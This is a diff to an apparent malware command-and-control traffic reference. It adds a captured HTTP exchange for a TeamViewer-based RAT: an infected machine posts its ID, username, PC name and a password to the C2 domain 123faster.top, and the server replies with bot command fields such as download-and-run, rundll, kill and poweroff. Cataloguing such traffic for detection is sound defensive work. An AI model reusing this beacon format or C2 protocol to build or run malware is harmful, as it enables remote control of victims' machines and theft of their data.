@@ -2664,6 +2664,30 @@ GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/trickbot.png "Trickbot")
 
+#### Tvrat Teamviewer RAT
+~~~
+POST /~f83g7bfiunwjsd1/g4t3_indata.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B150 Safari/604.1
+Host: 123faster.top
+Content-Length: 121
+Cache-Control: no-cache
+
+uuid=3B7B4057-3211-3A57-36E2DD91&id=.1609454960&pass=18c5ft&username=admin&pcname=USER-PC&osver=Windows 7 SP 1&timeout=70
+
+HTTP/1.1 200 OK
+Server: nginx/1.14.1
+Date: Mon, 03 Feb 2020 21:33:21 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept-Encoding
+Strict-Transport-Security: max-age=31536000;
+
+drun_command=0&drun_URL=NULL&rundll_command=0&rundll_URL=NULL&update_command=0&update_URL=NULL&restart_command=0&terminate_command=0&kill_command=0&poweroff_command=0&reboot_command=0&setinterval_command=0&setinterval_time=70
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/tvrat.png "Tvrat")
+
 #### Ursa Loader
 ~~~
 POST /nj41.php HTTP/1.1
